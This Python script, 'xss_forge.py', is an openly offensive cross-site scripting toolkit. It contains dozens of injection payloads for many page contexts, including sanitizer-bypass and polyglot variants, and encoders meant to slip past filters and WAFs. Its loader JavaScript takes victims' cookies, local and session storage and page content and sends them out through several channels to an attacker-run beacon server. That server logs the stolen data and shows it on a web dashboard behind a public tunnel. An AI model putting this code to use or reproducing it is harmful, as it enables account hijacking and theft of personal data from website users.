#!/usr/bin/env python3                                  # xss_forge.py — v2 · payloads, encoders, beacon server, DOM sink scanner                                       # Actor - kArmasec  ☠ inject em for fun  ☠ —
# Termux setup:  pkg install python curl cloudflared jq && termux-setup-storage
# Runs on stdlib only. No pip deps. No browser needed.

import argparse, json, sys, os, time, base64, urllib.parse, html, re, threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from datetime import datetime, timezone

# ═══════════════════════════════════════════════════════════════ payloads
# {CB} = callback base URL. Every payload calls home to /x.js (loader).
# The loader is the only thing that runs sensitive logic; payloads are
# kept small so they pass through filters and length limits.

PAYLOADS = {
# ─── plain HTML text node ───────────────────────────────────────
"html_text": [
    '<script src="{CB}/x.js"></script>',
    '<img src=x onerror="import(`{CB}/x.js`)">',
    '<img src=x onerror="fetch(`{CB}/x.js`).then(r=>r.text()).then(eval)">',
    '<svg onload="import(`{CB}/x.js`)">',
    '<svg><script href="{CB}/x.js" />',
    '<details open ontoggle="import(`{CB}/x.js`)">',
    '<video><source onerror="import(`{CB}/x.js`)">',
    '<iframe srcdoc="<script src={CB}/x.js></script>"></iframe>',
    '<object data="javascript:import(`{CB}/x.js`)">',
    '<marquee onstart="import(`{CB}/x.js`)">',
    '<body onload="import(`{CB}/x.js`)">',
    '<input autofocus onfocus="import(`{CB}/x.js`)">',
    '<select autofocus onfocus="import(`{CB}/x.js`)"><option>',
    '<textarea autofocus onfocus="import(`{CB}/x.js`)"></textarea>',
    '<keygen autofocus onfocus="import(`{CB}/x.js`)">',
    '<isindex action=javascript:import(`{CB}/x.js`) type=image>',
    '<button form=1 formaction="javascript:import(`{CB}/x.js`)">x</button>',
    '<math><mtext><table><mglyph><style><img src=x onerror="import(`{CB}/x.js`)">',
],
# ─── attribute, double-quoted ───────────────────────────────────
"attr_dq": [
    '"><script src="{CB}/x.js"></script><x a="',
    '"><img src=x onerror="import(`{CB}/x.js`)"><x a="',
    '"><svg onload="import(`{CB}/x.js`)"><x a="',
    '" autofocus onfocus="import(`{CB}/x.js`)" x="',
    '" onmouseover="import(`{CB}/x.js`)" x="',
    '" onclick="import(`{CB}/x.js`)" x="',
    '" onanimationstart="import(`{CB}/x.js`)" style="animation-name:x" x="',
],
# ─── attribute, single-quoted ───────────────────────────────────
"attr_sq": [
    "'><script src='{CB}/x.js'></script><x a='",
    "'><img src=x onerror='import(`{CB}/x.js`)'><x a='",
    "' autofocus onfocus='import(`{CB}/x.js`)' x='",
    "' onmouseover='import(`{CB}/x.js`)' x='",
],
# ─── attribute, unquoted ────────────────────────────────────────
"attr_unquoted": [
    '><script src={CB}/x.js></script><x a=',
    ' autofocus onfocus=import(`{CB}/x.js`) x=',
    ' onmouseover=import(`{CB}/x.js`) x=',
],
# ─── inside a JS string (double) ────────────────────────────────
"js_dq": [
    '";import(`{CB}/x.js`);//',
    '";fetch(`{CB}/x.js`).then(r=>r.text()).then(eval);//',
    '";(function(){var s=document.createElement("script");s.src=`{CB}/x.js`;document.head.appendChild(s)})();//',
    '";top.location=`{CB}/x.js`;//',
],
# ─── inside a JS string (single) ────────────────────────────────
"js_sq": [
    '\';import(`{CB}/x.js`);//',
    '\';fetch(`{CB}/x.js`).then(r=>r.text()).then(eval);//',
    '\';(function(){var s=document.createElement("script");s.src=`{CB}/x.js`;document.head.appendChild(s)})();//',
],
# ─── inside a template literal ──────────────────────────────────
"js_template": [
    '${fetch(`{CB}/x.js`).then(r=>r.text()).then(eval)}',
    '${import(`{CB}/x.js`)}',
    '`;import(`{CB}/x.js`);//',
],
# ─── bare JS (no string wrapper detected) ───────────────────────
"js_bare": [
    'import(`{CB}/x.js`)',
    'fetch(`{CB}/x.js`).then(r=>r.text()).then(eval)',
    'eval(atob("'+base64.b64encode(b'import("/x")').decode()+'"));fetch(`{CB}/x.js`).then(r=>r.text()).then(eval)',
],
# ─── already inside a tag, add an attribute ─────────────────────
"in_tag": [
    ' autofocus onfocus="import(`{CB}/x.js`)"',
    ' onmouseover="import(`{CB}/x.js`)"',
    ' onclick="import(`{CB}/x.js`)"',
    ' style="animation-name:x" onanimationstart="import(`{CB}/x.js`)"',
],
# ─── sink is an href/src/action ─────────────────────────────────
"url_href": [
    'javascript:import(`{CB}/x.js`)',
    'javascript:fetch(`{CB}/x.js`).then(r=>r.text()).then(eval)',
    'data:text/html,<script src="{CB}/x.js"></script>',
    'data:text/html,<img src=x onerror="import(`{CB}/x.js`)">',
    'javascript:void(fetch(`{CB}/x.js`).then(r=>r.text()).then(eval))',
],
# ─── style block or style attr ──────────────────────────────────
"css": [
    'x{{background:url("{CB}/p?css=1&c="+encodeURIComponent(document.cookie))}}',
    '</style><script src="{CB}/x.js"></script><style>',
    'expression(import(`{CB}/x.js`))',
    'x{{background-image:image-set(url("{CB}/x.js"))}}',
],
# ─── inside an SVG block ────────────────────────────────────────
"svg": [
    '<svg><script href="{CB}/x.js" />',
    '<svg><animate onbegin="import(`{CB}/x.js`)" attributeName=x dur=1s>',
    '<svg><set attributeName=onmouseover to="import(`{CB}/x.js`)">',
    '<svg onload="import(`{CB}/x.js`)">',
],
# ─── JSON reflected into a script context ───────────────────────
"json": [
    '{"x":"</script><script src=\\"{CB}/x.js\\"></script>"}',
    '{"x":"\\u003c/script\\u003e\\u003cscript src=\\"{CB}/x.js\\"\\u003e\\u003c/script\\u003e"}',
    '{"x":"<img src=x onerror=\\"import(`{CB}/x.js`)\\">"}',
],
# ─── modern framework sinks ─────────────────────────────────────
"angular": [
    '{{constructor.constructor(\'fetch(`{CB}/x.js`).then(r=>r.text()).then(eval)\')()}}',
    '{{$eval(\'fetch(`{CB}/x.js`).then(r=>r.text()).then(eval)\')}}',
    '{{[].constructor.constructor(\'import(`{CB}/x.js`)\')()}}',
    'ng-app="x" ng-csp><script src="{CB}/x.js"></script>',
],
"vue": [
    '{{_c.constructor(\'return globalThis\')().fetch(`{CB}/x.js`).then(r=>r.text()).then(eval)}}',
    '{{constructor.constructor(\'fetch(`{CB}/x.js`).then(r=>r.text()).then(eval)\')()}}',
],
"react_dangerously": [
    '<img src=x onerror="import(`{CB}/x.js`)">',
],
# ─── mutation XSS / DOMPurify bypasses ──────────────────────────
"mxss": [
    '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=import(`{CB}/x.js`)">">',
    '<form><math><mtext></form><form><mglyph><style></math><img src onerror=import(`{CB}/x.js`)>',
    '<noscript><p title="</noscript><img src=x onerror=import(`{CB}/x.js`)>">',
    '<math><mtext><table><mglyph><style><math><mtext></math></style></mglyph></table></mtext></math><img src=x onerror=import(`{CB}/x.js`)>',
],
# ─── DOM clobbering (for script src sinks) ─────────────────────
"dom_clobber": [
    '<a id=x><a id=x name=y href="javascript:import(`{CB}/x.js`)">',
    '<form id=x><input name=action formaction="javascript:import(`{CB}/x.js`)">',
    '<img name=x src="{CB}/x.js">',
],
# ─── blind XSS (stored, admin-panel) ────────────────────────────
"blind": [
    '"><script src="{CB}/x.js"></script>',
    "'><script src='{CB}/x.js'></script>",
    '"><img src=x onerror="import(`{CB}/x.js`)">',
    'javascript:fetch(`{CB}/x.js`).then(r=>r.text()).then(eval)',
    '<iframe src="{CB}/x.js"></iframe>',
    '"><svg onload="import(`{CB}/x.js`)">',
],
# ─── polyglot (fires in multiple contexts) ─────────────────────
"polyglot": [
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=import(`{CB}/x.js`) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=import(`{CB}/x.js`)//>\\x3e',
    '"><svg/onload=import(`{CB}/x.js`)//<script>/*\'`*/',
    '\'"><img src=x onerror=import(`{CB}/x.js`)>',
],
}

# ═══════════════════════════════════════════════════════════════ encoders
def enc_url(s):          return urllib.parse.quote(s, safe='')
def enc_url2(s):         return enc_url(enc_url(s))
def enc_url3(s):         return enc_url(enc_url2(s))
def enc_html_dec(s):     return ''.join(f'&#{ord(c)};' for c in s)
def enc_html_hex(s):     return ''.join(f'&#x{ord(c):x};' for c in s)
def enc_html_named(s):
    m = {'<':'&lt;','>':'&gt;','"':'&quot;',"'":'&apos;','&':'&amp;'}
    return ''.join(m.get(c, c) for c in s)
def enc_js_hex(s):       return ''.join(f'\\x{ord(c):02x}' for c in s)
def enc_js_uni(s):       return ''.join(f'\\u{ord(c):04x}' for c in s)
def enc_js_oct(s):       return ''.join(f'\\{ord(c):o}' for c in s)
def enc_js_u2028(s):     return enc_js_uni(s).replace('\\u2028','\\u2028').replace('\\u2029','\\u2029')
def enc_b64(s):          return base64.b64encode(s.encode()).decode()
def enc_b64url(s):       return base64.urlsafe_b64encode(s.encode()).decode()
def enc_case(s):
    return ''.join(c.upper() if i%2==0 and c.isalpha() else c.lower() if c.isalpha() else c
                   for i, c in enumerate(s))
def enc_angle_hex(s):    return s.replace('<','&#x3c;').replace('>','&#x3e;')
def enc_angle_dec(s):    return s.replace('<','&#60;').replace('>','&#62;')
def enc_split(s):
    return s.replace('<script','<scr<script>ipt').replace('</script','</scr</script>ipt')
def enc_css_esc(s):
    return ''.join(f'\\{ord(c):x} ' for c in s)
def enc_utf16be(s):
    return ''.join(f'\\u{ord(c):04x}' for c in s)[::-1]
def enc_chain_hj(s):     return enc_url(enc_html_hex(s))
def enc_chain_uj(s):     return enc_url2(enc_js_uni(s))
def enc_backtick(s):     return s.replace('`','\\`')

ENCODERS = {
    'url':enc_url,'url2':enc_url2,'url3':enc_url3,
    'html_dec':enc_html_dec,'html_hex':enc_html_hex,'html_named':enc_html_named,
    'js_hex':enc_js_hex,'js_uni':enc_js_uni,'js_oct':enc_js_oct,'js_ls':enc_js_u2028,
    'b64':enc_b64,'b64url':enc_b64url,'case':enc_case,'backtick':enc_backtick,
    'angle_hex':enc_angle_hex,'angle_dec':enc_angle_dec,'split':enc_split,
    'css':enc_css_esc,'utf16be':enc_utf16be,'chain_hj':enc_chain_hj,'chain_uj':enc_chain_uj,
}

# ═══════════════════════════════════════════════════════════════ DOM sinks
# Static scan of returned HTML for client-side sinks that take user input.
DOM_SINKS = [
    (r'\.innerHTML\s*=', 'innerHTML_assign'),
    (r'\.outerHTML\s*=', 'outerHTML_assign'),
    (r'document\.write\s*\(', 'document_write'),
    (r'document\.writeln\s*\(', 'document_writeln'),
    (r'eval\s*\(', 'eval'),
    (r'new\s+Function\s*\(', 'Function_ctor'),
    (r'setTimeout\s*\(\s*["\']', 'setTimeout_string'),
    (r'setInterval\s*\(\s*["\']', 'setInterval_string'),
    (r'location\.hash', 'location_hash'),
    (r'location\.search', 'location_search'),
    (r'location\.href\s*=', 'location_href'),
    (r'\.html\s*\(', 'jquery_html'),
    (r'\.append\s*\(', 'jquery_append'),
    (r'\$\(\s*["\']?<', 'jquery_dollar_html'),
    (r'\.setAttribute\s*\(', 'setAttribute'),
    (r'insertAdjacentHTML', 'insertAdjacentHTML'),
    (r'dangerouslySetInnerHTML', 'react_danger'),
    (r'v-html', 'vue_v_html'),
    (r'ng-bind-html', 'angular_bind_html'),
    (r'\$sce\.trustAsHtml', 'angular_trust'),
    (r'\.srcdoc\s*=', 'srcdoc_assign'),
]

# ═══════════════════════════════════════════════════════════════ WAF sigs
WAF_SIGS = {
    'cloudflare':   [r'cloudflare', r'cf-ray', r'__cfduid', r'cf-chl'],
    'akamai':       [r'akamai', r'ak-bmsc', r'reference #\d+\.\w+'],
    'sucuri':       [r'x-sucuri', r'sucuri\.net', r'sucuri_cloudproxy'],
    'imperva':      [r'incapsula', r'visid_incap', r'x-iinfo'],
    'f5':           [r'big-?ip', r'x-wa-info'],
    'aws_waf':      [r'awselb', r'x-amzn-requestid'],
    'modsec':       [r'mod_security', r'modsecurity', r'not acceptable!'],
    'fortiweb':     [r'fortiweb', r'fortigate'],
    'barracuda':    [r'barracuda', r'barra'],
    'fastly':       [r'fastly', r'x-fastly'],
    'nginx_waf':    [r'nginx-wallarm', r'wallarm'],
}

# ═══════════════════════════════════════════════════════════════ loader
# Multi-channel exfil: img, fetch, sendBeacon, form, ws, iframe-probe.
# Every channel that fires gives you one more signal the beacon works.

LOADER_JS = r'''(function(){
try{
var d={
u:location.href,o:document.domain,c:document.cookie,r:document.referrer,
t:document.title,ua:navigator.userAgent,ts:Date.now(),
tz:(Intl.DateTimeFormat().resolvedOptions||function(){return{}})().timeZone||'',
sw:screen.width,sh:screen.height,w:innerWidth,h:innerHeight,
l:JSON.stringify(localStorage),s:JSON.stringify(sessionStorage),
h_:(document.documentElement.outerHTML||'').slice(0,8000),
m:(document.body&&document.body.innerText?document.body.innerText:'').slice(0,3000)
};
try{d.cv=(document.querySelector('canvas')||{toDataURL:function(){return''}}).toDataURL().slice(-256)}catch(e){}
var qs=Object.keys(d).map(function(k){return k+'='+encodeURIComponent(d[k])}).join('&');
var sent=false;
try{new Image().src='{CB}/p?'+qs;sent=true}catch(e){}
try{navigator.sendBeacon('{CB}/p',qs);sent=true}catch(e){}
try{fetch('{CB}/p?'+qs,{mode:'no-cors',keepalive:true})}catch(e){}
try{
var f=document.createElement('form');f.method='POST';f.action='{CB}/p';f.style.display='none';
var i=document.createElement('input');i.name='d';i.value=qs;f.appendChild(i);
document.body&&document.body.appendChild(f);f.submit();
}catch(e){}
try{if(!sent){top.location='{CB}/p?'+qs}}catch(e){}
}catch(e){}
})();'''

# ═══════════════════════════════════════════════════════════════ server
HITS = []
HITS_LOCK = threading.Lock()
GIF = (b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff'
       b'!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00'
       b'\x00\x02\x02D\x01\x00;')

class H(BaseHTTPRequestHandler):
    server_version = 'nginx'
    def log_message(self, fmt, *a): pass
    def _cors(self):
        self.send_header('Access-Control-Allow-Origin','*')
        self.send_header('Access-Control-Allow-Methods','GET,POST,OPTIONS')
        self.send_header('Access-Control-Allow-Headers','*')
    def do_OPTIONS(self):
        self.send_response(204); self._cors(); self.end_headers()
    def _serve(self, body, ctype, status=200):
        self.send_response(status)
        self.send_header('Content-Type', ctype)
        self.send_header('Cache-Control','no-store')
        self._cors(); self.end_headers()
        self.wfile.write(body)
    def _cb(self):
        return 'https://' + self.headers.get('Host','localhost') if \
               self.headers.get('X-Forwarded-Proto')=='https' else \
               'http://' + self.headers.get('Host','localhost')
    def do_GET(self):
        p = urllib.parse.urlparse(self.path)
        if p.path == '/x.js':
            return self._serve(LOADER_JS.replace('{CB}',self._cb()).encode(),
                               'application/javascript')
        if p.path == '/p':
            return self._hit(urllib.parse.parse_qs(p.query))
        if p.path == '/':           return self._serve(self._ui().encode(),'text/html; charset=utf-8')
        if p.path == '/hits':       return self._serve(json.dumps(HITS,indent=2).encode(),'application/json')
        if p.path == '/hits.json':  return self._serve(json.dumps(HITS,indent=2).encode(),'application/json')
        if p.path == '/hits.log':
            try: b = open('hits.log','rb').read()
            except FileNotFoundError: b = b''
            return self._serve(b,'text/plain')
        if p.path == '/tail':
            return self._serve(self._tail().encode(),'text/html; charset=utf-8')
        self._serve(b'404','text/plain',404)
    def do_POST(self):
        p = urllib.parse.urlparse(self.path)
        if p.path == '/p':
            n = int(self.headers.get('Content-Length') or 0)
            body = self.rfile.read(n).decode('utf-8','replace') if n else ''
            return self._hit(urllib.parse.parse_qs(body))
        self._serve(b'404','text/plain',404)
    def _hit(self, q):
        d = {k:v[0] for k,v in q.items()}
        h = {'ts':datetime.now(timezone.utc).isoformat(),
             'ip':self.client_address[0],
             'hdrs':{k:v for k,v in self.headers.items()},
             'data':d}
        with HITS_LOCK:
            HITS.append(h)
            with open('hits.log','a') as f: f.write(json.dumps(h)+'\n')
        sys.stderr.write(f"[hit] {h['ip']} {d.get('u','?')[:80]}\n")
        self._serve(GIF,'image/gif')
    def _ui(self):
        rows=[]
        for h in reversed(HITS[-200:]):
            d=h['data']
            rows.append('<tr><td>%s</td><td>%s</td><td><a href="%s">%s</a></td>'
                        '<td><pre>%s</pre></td><td><pre>%s</pre></td></tr>' % (
                h['ts'],h['ip'],
                html.escape(d.get('u','')),html.escape(d.get('u','?')[:120]),
                html.escape(d.get('c',''))[:300],
                html.escape(d.get('l',''))[:300]))
        return ('<!doctype html><meta charset=utf-8><title>xss_forge</title>'
                '<style>body{font:12px/1.4 monospace;background:#0b0b0b;color:#ddd;padding:16px}'
                'table{border-collapse:collapse;width:100%}'
                'td,th{border:1px solid #2a2a2a;padding:6px;vertical-align:top;text-align:left}'
                'th{background:#161616}a{color:#6cf}pre{margin:0;white-space:pre-wrap;max-width:400px}'
                'h1{color:#8f8}</style>'
                f'<h1>xss_forge — {len(HITS)} hits</h1>'
                '<p><a href="/hits.json">json</a> · <a href="/hits.log">raw log</a> · <a href="/tail">tail</a></p>'
                '<table><tr><th>ts</th><th>ip</th><th>url</th><th>cookies</th><th>storage</th></tr>'
                + ''.join(rows) + '</table>')
    def _tail(self):
        return ('<!doctype html><meta charset=utf-8><meta http-equiv=refresh content=3>'
                '<style>body{font:12px monospace;background:#0b0b0b;color:#8f8;padding:16px}pre{white-space:pre-wrap}</style>'
                '<h1>live tail (3s refresh)</h1><pre>' +
                html.escape(json.dumps(HITS[-20:], indent=2)) + '</pre>')

# ═══════════════════════════════════════════════════════════════ domscan
def domscan(html_body, url=''):
    found = []
    for pat, name in DOM_SINKS:
        for m in re.finditer(pat, html_body, re.I):
            s = max(0, m.start()-60); e = min(len(html_body), m.end()+60)
            found.append({'sink':name, 'ctx':html_body[s:e].replace('\n',' ')})
    return found

def wafscan(headers, body):
    hits = []
    low_hdrs = {k.lower():str(v).lower() for k,v in headers.items()}
    low_body = body.lower()[:5000]
    for waf, pats in WAF_SIGS.items():
        for pat in pats:
            rx = re.compile(pat, re.I)
            if any(rx.search(k) or rx.search(v) for k,v in low_hdrs.items()):
                hits.append({'waf':waf, 'where':'header', 'sig':pat}); break
            if rx.search(low_body):
                hits.append({'waf':waf, 'where':'body', 'sig':pat}); break
    return hits

# ═══════════════════════════════════════════════════════════════ cli
def cmd_list(a):
    print("contexts:")
    for k in PAYLOADS: print(f"  {k:18} {len(PAYLOADS[k])} payloads")
    print("\nencoders:", ', '.join(ENCODERS))
def cmd_payloads(a):
    if a.context not in PAYLOADS:
        print(f"unknown context: {a.context}", file=sys.stderr); return 1
    cb = a.cb.rstrip('/')
    for p in PAYLOADS[a.context]:
        out = p.format(CB=cb) if '{CB}' in p else p
        if a.encode: out = ENCODERS[a.encode](out)
        print(out)
def cmd_encode(a):
    if a.mode not in ENCODERS:
        print(f"unknown: {a.mode}", file=sys.stderr); return 1
    print(ENCODERS[a.mode](a.payload))
def cmd_serve(a):
    host,_,port = a.bind.partition(':')
    host = host or '0.0.0.0'; port = int(port or '8000')
    srv = ThreadingHTTPServer((host,port), H)
    print(f"[xss_forge] serving on http://{host}:{port}")
    print(f"[xss_forge] loader:   http://{host}:{port}/x.js")
    print(f"[xss_forge] beacon:   http://{host}:{port}/p")
    print(f"[xss_forge] UI:       http://{host}:{port}/")
    print(f"[xss_forge] tail:     http://{host}:{port}/tail")
    print(f"[xss_forge] termux:   pkg install python cloudflared")
    print(f"[xss_forge] tunnel:   cloudflared tunnel --url http://localhost:{port}")
    try: srv.serve_forever()
    except KeyboardInterrupt: print("\n[xss_forge] shutdown")
def cmd_domscan(a):
    body = open(a.file,'r',encoding='utf-8',errors='replace').read() if a.file != '-' else sys.stdin.read()
    for h in domscan(body, a.url): print(json.dumps(h))
def cmd_waf(a):
    import urllib.request
    req = urllib.request.Request(a.url, headers={'User-Agent':'Mozilla/5.0'})
    r = urllib.request.urlopen(req, timeout=15)
    body = r.read().decode('utf-8','replace')
    hits = wafscan(dict(r.headers), body)
    print(json.dumps(hits, indent=2) if hits else '[]')
def main():
    ap = argparse.ArgumentParser(prog='xss_forge')
    sub = ap.add_subparsers(dest='cmd', required=True)
    p = sub.add_parser('list'); p.set_defaults(fn=cmd_list)
    p = sub.add_parser('payloads'); p.set_defaults(fn=cmd_payloads)
    p.add_argument('--context', required=True); p.add_argument('--cb', required=True)
    p.add_argument('--encode')
    p = sub.add_parser('encode'); p.set_defaults(fn=cmd_encode)
    p.add_argument('--mode', required=True); p.add_argument('payload')
    p = sub.add_parser('serve'); p.set_defaults(fn=cmd_serve)
    p.add_argument('--bind', default='0.0.0.0:8000')
    p = sub.add_parser('domscan'); p.set_defaults(fn=cmd_domscan)
    p.add_argument('--file', default='-'); p.add_argument('--url', default='')
    p = sub.add_parser('waf'); p.set_defaults(fn=cmd_waf)
    p.add_argument('--url', required=True)
    a = ap.parse_args(); sys.exit(a.fn(a) or 0)
if __name__ == '__main__': main()
